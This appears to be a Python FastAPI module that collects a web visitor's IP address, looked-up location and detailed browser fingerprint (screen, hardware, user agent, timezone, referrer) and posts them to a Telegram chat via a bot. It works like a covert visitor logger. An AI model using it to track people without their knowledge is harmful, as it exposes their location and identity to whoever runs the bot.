"""Partially by the author: Weever, modified by BRamil. Github: https://github.com/Weever1337"""

import aiohttp
from fastapi import Request
from typing import Dict, Any
from .models import TelegramInformant
from .ip_handler import IPAddressHandler as IP
from src.config.config import settings


class TelegramSender:
    def __init__(self) -> None:
        self.url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendMessage"
        self.session = aiohttp.ClientSession()

    async def send(self, request: Request, form: TelegramInformant) -> Dict[str, Any]:
        ip = IP(request)
        chat_id = settings.TELEGRAM_CHAT_ID
        params = {
            "chat_id": chat_id,
            "text": fr"""
**Новий запит:**

Локація: `{await ip.summarize_location()}`
IP: `{ip.ip}`

```
Location: {await ip.summarize_location()}
IP: {ip.ip}

Request:
{await request.json()}

JS:
innerWidth: {form.innerWidth}
innerHeight: {form.innerHeight}
screen_width: {form.screen_width}
screen_height: {form.screen_height}
userAgent: {form.userAgent}
platform: {form.platform}
language: {form.language}
location_href: {form.location_href}
connection_downlink: {form.connection_downlink}
connection_effective_type: {form.connection_effective_type}
online: {form.online}
performance_timing: {form.performance_timing}
max_touch_points: {form.max_touch_points}
hardware_concurrency: {form.hardware_concurrency}
device_memory: {form.device_memory}
color_depth: {form.color_depth}
pixel_depth: {form.pixel_depth}
timezone: {form.timezone}
cookies_enabled: {form.cookies_enabled}
referrer: {form.referrer}
visibility_state: {form.visibility_state}
document_title: {form.document_title}
page_load_time: {form.page_load_time}
```

\#новий\_запит
""",
            "parse_mode": "MarkdownV2",
        }
        print(params)
        async with aiohttp.ClientSession() as session:
            async with session.post(self.url, json=params) as response:
                print(await response.json())
                return await response.json()
